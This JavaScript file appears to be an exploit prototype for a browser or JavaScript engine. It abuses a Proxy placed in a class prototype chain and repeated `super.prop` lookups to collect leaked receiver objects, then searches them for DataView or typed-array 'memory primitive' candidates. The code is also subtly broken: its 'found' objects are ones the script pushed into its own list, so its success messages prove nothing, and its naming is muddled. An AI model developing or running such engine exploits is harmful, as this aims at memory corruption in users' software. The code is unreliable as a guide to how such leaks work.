import { debug_log } from './module/utils.mjs';


let leaked = [];
let pcre = null;

const proxy = new Proxy({}, {
    get(target, prop, receiver) {
        leaked.push(receiver);
        
        try {
            if (leaked.length === 1000) {
                let buf = new ArrayBuffer(0x100);
                let view = new DataView(buf);
                leaked.push(view);
            }
        } catch(e) {}
        
        return 0x41;
    }
});

class Base {
    constructor() {
        this.buffer = new ArrayBuffer(0x100);
        this.view = new DataView(this.buffer);
    }
    
    trigger() {
        return super.prop;
    }
}

Base.prototype.__proto__ = proxy;

let base = new Base();

for (let i = 0; i < 2000; i++) {
    base.trigger();
}

for (let i = 0; i < leaked.length; i++) {
    try {
        let obj = leaked[i];
        if (obj.byteLength !== undefined) {
            pcre = obj;
            break;
        }
    } catch(e) {}
}

if (pcre) {
    debug_log("Potential memory object found");
    
    try {
        let test = new Uint32Array(0x100);
        for (let i = 0; i < 2000; i++) {
            base.trigger();
            leaked.push(test);
        }
    } catch(e) {}
    
    let found = false;
    for (let i = 0; i < leaked.length; i++) {
        try {
            let obj = leaked[i];
            if (obj instanceof DataView || obj instanceof Uint32Array) {
                debug_log("Memory primitive candidate:", obj);
                debug_log("Memory primitive candidate:" + obj);
                found = true;
                break;
            }
        } catch(e) {}
    }
    
    if (!found) {
        debug_log("Try change value of i < 2000 ");
    }
} else {
    debug_log("No useful primitive yet");
}